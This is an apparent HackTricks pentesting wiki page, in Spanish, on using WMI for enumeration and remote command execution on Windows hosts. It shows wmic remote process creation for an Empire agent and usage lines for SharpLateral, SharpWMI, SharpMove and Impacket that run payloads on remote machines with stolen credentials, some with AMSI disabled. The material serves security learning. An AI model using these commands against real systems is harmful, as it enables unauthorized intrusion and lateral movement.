# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Explicación de cómo funciona

Se pueden abrir procesos en hosts donde se conozcan el nombre de usuario y la contraseña o el hash mediante WMI. Wmiexec ejecuta comandos mediante WMI, proporcionando una experiencia de shell semiinteractiva.

**dcomexec.py:** Mediante distintos endpoints DCOM, este script ofrece un shell semiinteractivo similar a `wmiexec.py`. El valor de `-object` seleccionado elige el endpoint; los objetos compatibles incluyen `MMC20.Application`, `ShellWindows` y `ShellBrowserWindow`, siendo este último el que proporciona la técnica Shell Browser Window destacada en el walkthrough original.<sup>[[2]](#references)[[3]](#references)</sup>

## Fundamentos de WMI

### Espacio de nombres

Estructurado en una jerarquía con estilo de directorios, el contenedor de nivel superior de WMI es \root, bajo el cual se organizan directorios adicionales, denominados espacios de nombres.<sup>[[1]](#references)</sup>
Comandos para listar espacios de nombres:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Las clases dentro de un namespace se pueden enumerar usando:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Clases**

Conocer el nombre de una clase de WMI, como win32_process, y el espacio de nombres en el que se encuentra es crucial para cualquier operación de WMI.
Comandos para enumerar las clases que comienzan con `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Invocación de una clase:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Métodos

Los métodos, que son una o más funciones ejecutables de las clases WMI, pueden ejecutarse.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumeración de WMI

### Estado del servicio WMI

Comandos para verificar si el servicio WMI está operativo:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Información del sistema y los procesos

Recopilación de información del sistema y los procesos mediante WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Para los atacantes, WMI es una herramienta potente para enumerar datos confidenciales sobre sistemas o dominios.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
La consulta remota de WMI para obtener información específica, como administradores locales o usuarios conectados, es posible mediante una construcción cuidadosa de los comandos.

### **Consulta manual de WMI remota**

La identificación sigilosa de administradores locales en una máquina remota y de los usuarios conectados puede lograrse mediante consultas WMI específicas. `wmic` también permite leer un archivo de texto para ejecutar comandos en varios nodos simultáneamente.<sup>[[1]](#references)</sup>

Para ejecutar un proceso de forma remota mediante WMI, como desplegar un agente de Empire, se utiliza la siguiente estructura de comando; una ejecución correcta se indica mediante un valor de retorno de "0":<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Este proceso ilustra la capacidad de WMI para la ejecución remota y la enumeración de sistemas, destacando su utilidad tanto para la administración de sistemas como para el pentesting.

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- También podrías usar **`wmiexec` de Impacket**.


## References

- [1] [Usar credenciales para apoderarse de equipos Windows - Parte 3 (WMI y WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Guía para principiantes del kit de herramientas Impacket, parte 1 - Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
